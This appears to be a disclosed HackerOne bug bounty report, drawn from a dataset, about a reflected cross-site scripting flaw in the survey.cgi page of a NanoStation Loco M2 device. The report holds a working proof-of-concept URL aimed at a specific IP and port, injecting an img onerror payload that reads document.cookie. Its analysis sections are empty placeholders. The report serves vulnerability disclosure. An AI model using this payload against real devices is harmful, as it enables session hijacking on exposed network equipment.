---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '149287'
original_report_id: '149287'
title: Reflected Xss in AirMax [Nanostation Loco M2]
weakness: Cross-site Scripting (XSS) - Generic
team_handle: ui
created_at: '2016-07-05T07:44:12.161Z'
disclosed_at: '2016-12-12T20:36:13.955Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Xss in AirMax [Nanostation Loco M2]

## Metadata

- HackerOne Report ID: 149287
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: ui
- Disclosed At: 2016-12-12T20:36:13.955Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Dear James,

I've found a reflected xss in nanostation Loco M2.

just open this link and xss will execute.
http://172.98.67.89:22057/survey.cgi?iface=%22%3E%3Cimg%20src=x%20onerror=prompt(document.cookie)%3E

{F103333}

Best Regard
Shubham

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
